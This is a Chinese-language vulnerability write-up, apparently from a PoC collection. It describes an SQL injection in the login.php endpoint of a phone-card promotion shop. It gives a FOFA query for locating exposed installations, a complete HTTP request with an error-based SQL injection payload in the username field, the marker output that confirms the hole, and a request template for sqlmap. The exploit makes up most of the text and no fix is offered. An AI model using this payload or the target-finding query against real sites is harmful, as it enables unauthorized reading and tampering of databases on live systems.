# 手机卡号推广商城ssk存在SQL注入漏洞

# 一、漏洞简介
 手机卡号推广商城是一个在线平台，提供手机卡号销售、号码推广、套餐介绍、安全保障和售后服务等功能，满足用户对手机卡号的需求，为用户提供便利的服务体验。 手机卡号推广商城 login.php接口处存在 SQL 注入漏洞，恶意攻击者可能会利用此漏洞修改数据库中的数据，例如添加、删除或修改记录，导致数据损坏或丢失。

# 二、影响版本
+ 手机卡号推广商城

# 三、资产测绘
+ fofa`body="zgdx.php"`
+ 特征

![1715176303991-c852989c-d754-4c4a-8f26-6bde61362c67.png](./img/TZ56b5Nh8Wr31Cat/1715176303991-c852989c-d754-4c4a-8f26-6bde61362c67-390785.png)

 手机卡号推广商城是一个在线平台，提供手机卡号销售、号码推广、套餐介绍、安全保障和售后服务等功能，满足用户对手机卡号的需求，为用户提供便利的服务体验。  

# 四、漏洞复现
```http
POST /ssk/login.php HTTP/1.1
Host: 
Content-Length: 199
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36

username=' OR (SELECT 5126 FROM(SELECT COUNT(*),CONCAT(0x716a6a6a71,(SELECT (ELT(5126=5126,1))),0x71786b7a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- Tyft&password=123123
```

![1715178848654-441442f8-e1fe-4d1a-bf55-eb7b8fd2aac6.png](./img/TZ56b5Nh8Wr31Cat/1715178848654-441442f8-e1fe-4d1a-bf55-eb7b8fd2aac6-592450.png)

```http
qjjjq1qxkzq1
```

sqlmap

```http
POST /ssk/login.php HTTP/1.1
Host: 
Content-Length: 199
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36

username=&password=123123
```

![1715178886524-70e83ac2-67e8-47a8-a53e-99049d34e5c4.png](./img/TZ56b5Nh8Wr31Cat/1715178886524-70e83ac2-67e8-47a8-a53e-99049d34e5c4-472915.png)



> 更新: 2024-05-09 11:09:15  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/xwfc57fpx7o7dqr8>